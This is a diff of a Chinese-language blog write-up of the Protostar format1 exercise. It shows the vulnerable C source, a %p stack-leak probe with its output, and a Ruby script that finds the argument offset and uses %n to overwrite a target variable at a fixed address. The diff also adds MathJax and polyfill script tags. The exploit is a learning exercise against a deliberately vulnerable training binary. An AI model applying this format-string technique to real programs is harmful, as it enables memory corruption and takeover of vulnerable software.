@@ -49,6 +49,11 @@ if (!doNotTrack) {
 
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@callmebill/lxgw-wenkai-web@latest/lxgwwenkaimono-regular/result.css" />
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+
+
 <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
@@ -57,6 +62,8 @@ if (!doNotTrack) {
 <meta name="msapplication-TileColor" content="#000000">
 <meta name="theme-color" content="#ffffff">
 
+        
+    
     </head>
     <body class="
     article-page
@@ -343,26 +350,26 @@ if (!doNotTrack) {
 </ul>
 <p>This level is at /opt/protostar/bin/format1</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;you have modified the target :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> target;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>string)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(string);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(target) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;you have modified the target :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><hr>
 <h2 id="argv1-p-breadcrumb">Argv[1], %p, Breadcrumb</h2>
 <p>乍一看，感觉好简单x</p>
@@ -380,8 +387,8 @@ if (!doNotTrack) {
 </blockquote>
 <hr>
 <p>那么开始尝试吧&hellip;使用 <code>ruby -e</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp$ /opt/protostar/bin/format1 <span class="sb">`</span>ruby -e <span class="s1">&#39;puts &#34;ABCD&#34; + &#34;|%p&#34;*131 &#39;</span><span class="sb">`</span>
-</span></span><span class="line"><span class="cl">ABCD<span class="p">|</span>0x804960c<span class="p">|</span>0xbffff628<span class="p">|</span>0x8048469<span class="p">|</span>0xb7fd8304<span class="p">|</span>0xb7fd7ff4<span class="p">|</span>0xbffff628<span class="p">|</span>0x8048435<span class="p">|</span>0xbffff7fc<span class="p">|</span>0xb7ff1040<span class="p">|</span>0x804845b<span class="p">|</span>0xb7fd7ff4<span class="p">|</span>0x8048450<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xbffff6a8<span class="p">|</span>0xb7eadc76<span class="p">|</span>0x2<span class="p">|</span>0xbffff6d4<span class="p">|</span>0xbffff6e0<span class="p">|</span>0xb7fe1848<span class="p">|</span>0xbffff690<span class="p">|</span>0xffffffff<span class="p">|</span>0xb7ffeff4<span class="p">|</span>0x804824d<span class="p">|</span>0x1<span class="p">|</span>0xbffff690<span class="p">|</span>0xb7ff0626<span class="p">|</span>0xb7fffab0<span class="p">|</span>0xb7fe1b28<span class="p">|</span>0xb7fd7ff4<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xbffff6a8<span class="p">|</span>0xdda5d91d<span class="p">|</span>0xf7f1cf0d<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0x2<span class="p">|</span>0x8048340<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xb7ff6210<span class="p">|</span>0xb7eadb9b<span class="p">|</span>0xb7ffeff4<span class="p">|</span>0x2<span class="p">|</span>0x8048340<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0x8048361<span class="p">|</span>0x804841c<span class="p">|</span>0x2<span class="p">|</span>0xbffff6d4<span class="p">|</span>0x8048450<span class="p">|</span>0x8048440<span class="p">|</span>0xb7ff1040<span class="p">|</span>0xbffff6cc<span class="p">|</span>0xb7fff8f8<span class="p">|</span>0x2<span class="p">|</span>0xbffff7e1<span class="p">|</span>0xbffff7fc<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xbffff98a<span class="p">|</span>0xbffff998<span class="p">|</span>0xbffff9ac<span class="p">|</span>0xbffff9ce<span class="p">|</span>0xbffff9e1<span class="p">|</span>0xbffff9eb<span class="p">|</span>0xbffffedb<span class="p">|</span>0xbfffff19<span class="p">|</span>0xbfffff2d<span class="p">|</span>0xbfffff36<span class="p">|</span>0xbfffff47<span class="p">|</span>0xbfffff4f<span class="p">|</span>0xbfffff5f<span class="p">|</span>0xbfffff6c<span class="p">|</span>0xbfffffa2<span class="p">|</span>0xbfffffb1<span class="p">|</span>0xbfffffc4<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0x20<span class="p">|</span>0xb7fe2414<span class="p">|</span>0x21<span class="p">|</span>0xb7fe2000<span class="p">|</span>0x10<span class="p">|</span>0xf8bfbff<span class="p">|</span>0x6<span class="p">|</span>0x1000<span class="p">|</span>0x11<span class="p">|</span>0x64<span class="p">|</span>0x3<span class="p">|</span>0x8048034<span class="p">|</span>0x4<span class="p">|</span>0x20<span class="p">|</span>0x5<span class="p">|</span>0x7<span class="p">|</span>0x7<span class="p">|</span>0xb7fe3000<span class="p">|</span>0x8<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0x9<span class="p">|</span>0x8048340<span class="p">|</span>0xb<span class="p">|</span>0x3e9<span class="p">|</span>0xc<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xd<span class="p">|</span>0x3e9<span class="p">|</span>0xe<span class="p">|</span>0x3e9<span class="p">|</span>0x17<span class="p">|</span>0x1<span class="p">|</span>0x19<span class="p">|</span>0xbffff7cb<span class="p">|</span>0x1f<span class="p">|</span>0xbfffffe1<span class="p">|</span>0xf<span class="p">|</span>0xbffff7db<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0xdc000000<span class="p">|</span>0xdcc44ff8<span class="p">|</span>0x5d311124<span class="p">|</span>0xf251c72e<span class="p">|</span>0x6923116e<span class="p">|</span>0x363836<span class="p">|</span>0x706f2f00<span class="p">|</span>0x72702f74<span class="p">|</span>0x736f746f<span class="p">|</span>0x2f726174<span class="p">|</span>0x2f6e6962<span class="p">|</span>0x6d726f66<span class="p">|</span>0x317461<span class="p">|</span>0x44434241user@protostar:/tmp$
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ /opt/protostar/bin/format1 <span style="color:#e6db74">`</span>ruby -e <span style="color:#e6db74">&#39;puts &#34;ABCD&#34; + &#34;|%p&#34;*131 &#39;</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>ABCD|0x804960c|0xbffff628|0x8048469|0xb7fd8304|0xb7fd7ff4|0xbffff628|0x8048435|0xbffff7fc|0xb7ff1040|0x804845b|0xb7fd7ff4|0x8048450|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0xbffff6a8|0xb7eadc76|0x2|0xbffff6d4|0xbffff6e0|0xb7fe1848|0xbffff690|0xffffffff|0xb7ffeff4|0x804824d|0x1|0xbffff690|0xb7ff0626|0xb7fffab0|0xb7fe1b28|0xb7fd7ff4|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0xbffff6a8|0xdda5d91d|0xf7f1cf0d|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0x2|0x8048340|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0xb7ff6210|0xb7eadb9b|0xb7ffeff4|0x2|0x8048340|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0x8048361|0x804841c|0x2|0xbffff6d4|0x8048450|0x8048440|0xb7ff1040|0xbffff6cc|0xb7fff8f8|0x2|0xbffff7e1|0xbffff7fc|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0xbffff98a|0xbffff998|0xbffff9ac|0xbffff9ce|0xbffff9e1|0xbffff9eb|0xbffffedb|0xbfffff19|0xbfffff2d|0xbfffff36|0xbfffff47|0xbfffff4f|0xbfffff5f|0xbfffff6c|0xbfffffa2|0xbfffffb1|0xbfffffc4|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0x20|0xb7fe2414|0x21|0xb7fe2000|0x10|0xf8bfbff|0x6|0x1000|0x11|0x64|0x3|0x8048034|0x4|0x20|0x5|0x7|0x7|0xb7fe3000|0x8|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0x9|0x8048340|0xb|0x3e9|0xc|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0xd|0x3e9|0xe|0x3e9|0x17|0x1|0x19|0xbffff7cb|0x1f|0xbfffffe1|0xf|0xbffff7db|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0xdc000000|0xdcc44ff8|0x5d311124|0xf251c72e|0x6923116e|0x363836|0x706f2f00|0x72702f74|0x736f746f|0x2f726174|0x2f6e6962|0x6d726f66|0x317461|0x44434241user@protostar:/tmp$
 </span></span></code></pre></div><p>好耶，看起来第 131 个 <code>%p</code> 就是 <code>argv[1]</code> 开始的地方了！</p>
 <p>接下来看看 <code>%n</code> 的定义：</p>
 <blockquote>
@@ -392,36 +399,36 @@ if (!doNotTrack) {
 <hr>
 <h2 id="script-1">Script #1</h2>
 <p>于是我写出了如下的脚本：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/ruby</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">breadcrumb</span> <span class="o">=</span> <span class="s2">&#34;ABCD&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># convert ASCII to Hex in Little Endian</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># str: String</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># return: String</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">to_hex</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">str</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;N*&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;V*&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">)</span> <span class="o">*</span> <span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="k">end</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="o">=</span> <span class="mi">1</span>
-</span></span><span class="line"><span class="cl"><span class="n">maximum</span> <span class="o">=</span> <span class="mi">200</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="n">maximum</span>
-</span></span><span class="line"><span class="cl">	<span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;/opt/protostar/bin/format1 &#34;</span> <span class="o">+</span> <span class="n">breadcrumb</span> <span class="o">+</span> <span class="s2">&#34;%p&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">	<span class="n">result</span> <span class="o">=</span> <span class="sb">`</span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="sb">`</span>
-</span></span><span class="line"><span class="cl">	<span class="nb">puts</span> <span class="n">result</span>
-</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">include?</span> <span class="n">to_hex</span><span class="p">(</span><span class="n">breadcrumb</span><span class="p">)</span> <span class="k">then</span> <span class="k">break</span> <span class="k">end</span>
-</span></span><span class="line"><span class="cl">	<span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
-</span></span><span class="line"><span class="cl"><span class="k">end</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;index: </span><span class="si">#{</span><span class="n">index</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># address of target: 0x08049638</span>
-</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x38\x96\x04\x08</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;/opt/protostar/bin/format1 &#34;</span> <span class="o">+</span> <span class="n">target</span> <span class="o">+</span> <span class="p">(</span><span class="s2">&#34;%p&#34;</span> <span class="o">*</span> <span class="n">index</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;%n&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;Running: </span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="sb">`</span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="sb">`</span> 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/ruby</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>breadcrumb <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCD&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># convert ASCII to Hex in Little Endian</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># str: String</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># return: String</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_hex</span>(str)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> str<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;N*&#39;</span>)<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;V*&#39;</span>)<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;H*&#39;</span>) <span style="color:#f92672">*</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>index <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>maximum <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> index <span style="color:#f92672">&lt;</span> maximum
+</span></span><span style="display:flex;"><span>	command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/opt/protostar/bin/format1 &#34;</span> <span style="color:#f92672">+</span> breadcrumb <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%p&#34;</span> <span style="color:#f92672">*</span> (index <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>	result <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>	puts result
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>include? to_hex(breadcrumb) <span style="color:#66d9ef">then</span> <span style="color:#66d9ef">break</span> <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>	index <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">&#34;index: </span><span style="color:#e6db74">#{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># address of target: 0x08049638</span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\x96\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/opt/protostar/bin/format1 &#34;</span> <span style="color:#f92672">+</span> target <span style="color:#f92672">+</span> (<span style="color:#e6db74">&#34;%p&#34;</span> <span style="color:#f92672">*</span> index) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%n&#34;</span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">&#34;Running: </span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">`</span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span> 
 </span></span></code></pre></div><p>这个脚本的思路很简单：</p>
 <ol>
 <li>每次都多打印一个 <code>%p</code></li>
@@ -441,18 +448,18 @@ if (!doNotTrack) {
 <p>然后就可以把一串 ASCII 变成小端序的十六进制值</p>
 <p><del><em><strong>这 是 魔 法</strong></em></del></p>
 <p>开一个 <code>irb</code> 来看看到底发生了什么吧</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">00</span><span class="mi">9</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">tmp</span> <span class="o">=</span> <span class="s2">&#34;ABCD&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="o">=&gt;</span> <span class="s2">&#34;ABCD&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">010</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;N*&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">=&gt;</span> <span class="o">[</span><span class="mi">1094861636</span><span class="o">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">011</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;V*&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">=&gt;</span> <span class="s2">&#34;DCBA&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">012</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">=&gt;</span> <span class="o">[</span><span class="s2">&#34;44434241&#34;</span><span class="o">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">013</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span> <span class="o">*</span> <span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="o">=&gt;</span> <span class="s2">&#34;44434241&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">014</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">tmp</span><span class="o">.</span><span class="n">class</span>
-</span></span><span class="line"><span class="cl"><span class="o">=&gt;</span> <span class="nb">String</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>irb(main):<span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span>:<span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span> tmp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCD&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;ABCD&#34;</span>
+</span></span><span style="display:flex;"><span>irb(main):<span style="color:#ae81ff">010</span>:<span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span> tmp <span style="color:#f92672">=</span> tmp<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;N*&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">1094861636</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>irb(main):<span style="color:#ae81ff">011</span>:<span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span> tmp <span style="color:#f92672">=</span> tmp<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;V*&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;DCBA&#34;</span>
+</span></span><span style="display:flex;"><span>irb(main):<span style="color:#ae81ff">012</span>:<span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span> tmp <span style="color:#f92672">=</span> tmp<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;H*&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;44434241&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>irb(main):<span style="color:#ae81ff">013</span>:<span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span> tmp <span style="color:#f92672">=</span> tmp <span style="color:#f92672">*</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;44434241&#34;</span>
+</span></span><span style="display:flex;"><span>irb(main):<span style="color:#ae81ff">014</span>:<span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span> tmp<span style="color:#f92672">.</span>class
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> String
 </span></span></code></pre></div><p>可见分为了以下步骤</p>
 <ol>
 <li>
@@ -475,13 +482,13 @@ if (!doNotTrack) {
 <hr>
 <h2 id="breadcrumb-is-not-in-the-last-p">Breadcrumb is not in the last %p</h2>
 <p>可是执行这个脚本的时候却出现了这样的结果：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">...664106e50xf1fcc6110xabeb1fff0x6916e02d0x363836<span class="o">(</span>nil<span class="o">)</span>0x706f2f000x72702f740x736f746f0x2f7261740x2f6e69620x6d726f660x3174610x444342410x70257025
-</span></span><span class="line"><span class="cl">index: <span class="m">132</span>
-</span></span><span class="line"><span class="cl">Running: /opt/.....
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...664106e50xf1fcc6110xabeb1fff0x6916e02d0x363836<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x706f2f000x72702f740x736f746f0x2f7261740x2f6e69620x6d726f660x3174610x444342410x70257025
+</span></span><span style="display:flex;"><span>index: <span style="color:#ae81ff">132</span>
+</span></span><span style="display:flex;"><span>Running: /opt/.....
 </span></span></code></pre></div><p>打印了 132 个 <code>%p</code> ，然后确实出现了 <code>0x444342410</code>，但是却..不在最后一个 <code>%p</code> 上..而是在第 131 个</p>
 <p>那为什么不在打印了 131 个 <code>%p</code> 后就停下来呢&hellip;</p>
 <p>幸好每次增加一个 <code>%p</code> 的结果都有输出，让我们往上翻看一下 131 个 <code>%p</code> 时是什么情况&hellip;</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">......0x69622f720x6f662f6e0x74616d720x42410031
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>......0x69622f720x6f662f6e0x74616d720x42410031
 </span></span></code></pre></div><p><img src="/p/protostar_format_1/132p.png"
 	width="730"
 	height="550"
@@ -497,15 +504,15 @@ if (!doNotTrack) {
 <p>为什么打印 131 个 <code>%p</code> 时出现了 <code>0x42410031</code>&hellip;</p>
